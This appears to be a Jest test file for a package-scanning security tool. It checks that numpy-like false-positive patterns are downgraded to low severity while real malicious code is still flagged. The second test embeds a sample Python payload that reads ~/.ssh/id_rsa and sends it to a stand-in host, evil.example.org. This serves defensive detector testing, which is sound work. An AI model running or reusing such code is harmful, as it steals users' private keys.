import AdmZip from 'adm-zip';
import { createHash } from 'node:crypto';
import { runScan } from '../../src/security/scan-runner';
import { getConfig, resetConfigCache } from '../../src/config/config';

/**
 * 行为规则误报回归：numpy 等大型开源库普遍存在「读环境变量+发网络请求」「写文件路径含
 * /usr/local」「文档里的外部参考链接」等组合，旧规则将这些判为 high/medium，导致官方包
 * 被 QUARANTINE。这些规则降级为 low 后，maxSeverity 不应再达到 high。
 */
// 用真实配置基线，避免手写 SecurityConfig 漏字段；只覆盖影响判定的关键项。
resetConfigCache();
const cfg = {
  ...getConfig().security,
  blockSeverity: 'critical' as const,
  quarantineSeverity: 'high' as const,
  requireSignature: false,
  requireAdvisoryDb: false,
  trustedKeys: [],
};

const RANK: Record<string, number> = { none: 0, low: 1, medium: 2, high: 3, critical: 4 };

function makeWheel(extraCode: string): { buffer: Buffer; sha256: string } {
  const zip = new AdmZip();
  zip.addFile(
    'numpy/__init__.py',
    Buffer.from(`VERSION = "2.5.5"\n${extraCode}`),
  );
  zip.addFile(
    'numpy-2.5.5.dist-info/METADATA',
    Buffer.from('Metadata-Version: 2.1\nName: numpy\nVersion: 2.5.5\n'),
  );
  zip.addFile('numpy-2.5.5.dist-info/RECORD', Buffer.from(''));
  const buffer = zip.toBuffer();
  return { buffer, sha256: createHash('sha256').update(buffer).digest('hex') };
}

describe('行为规则误报降级（官方大包不应被隔离）', () => {
  it('numpy 式误报组合（env+egress / 系统路径 / 文档外链）最高仅 low', async () => {
    // 内联复现 numpy 官方 wheel 里的三类误报特征，不依赖外部大文件。
    const { buffer, sha256 } = makeWheel(`
import os
import urllib.request
api = os.environ.get("API_URL")
urllib.request.urlopen(api)
f = open("/usr/local/bin/site.txt", "w")
f.write("x")
# https://docs.scipy.org/doc/numpy
# https://en.wikipedia.org/wiki/NumPy
`);
    const result = await runScan(
      {
        ecosystem: 'pypi',
        filename: 'numpy-2.5.5-cp315-cp315t-win_arm64.whl',
        sha256,
        buffer,
      },
      cfg,
    );
    const max = result.findings.reduce(
      (acc, f) => (RANK[f.severity] > RANK[acc] ? f.severity : acc),
      'none',
    );
    expect(RANK[max]).toBeLessThan(RANK.high);

    const beh001 = result.findings.filter((f) => f.ruleId === 'BEH-001');
    const beh004 = result.findings.filter((f) => f.ruleId === 'BEH-004');
    const beh006 = result.findings.filter((f) => f.ruleId === 'BEH-006');
    expect(beh001.length).toBeGreaterThan(0);
    expect(beh001.every((f) => f.severity === 'low')).toBe(true);
    expect(beh004.length).toBeGreaterThan(0);
    expect(beh004.every((f) => f.severity === 'low')).toBe(true);
    expect(beh006.every((f) => f.severity === 'low')).toBe(true);
  });

  it('真正的恶意代码（读敏感文件+外发 BEH-002 critical）仍然拦截', async () => {
    const { buffer, sha256 } = makeWheel(`
import os, urllib.request
key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
urllib.request.urlopen("https://evil.example.org", data=key.encode())
`);
    const result = await runScan(
      {
        ecosystem: 'pypi',
        filename: 'evil-1.0.0-py3-none-any.whl',
        sha256,
        buffer,
      },
      cfg,
    );
    const max = result.findings.reduce(
      (acc, f) => (RANK[f.severity] > RANK[acc] ? f.severity : acc),
      'none',
    );
    expect(RANK[max]).toBeGreaterThanOrEqual(RANK.high);
    expect(result.findings.some((f) => f.ruleId === 'BEH-002')).toBe(true);
  });
});
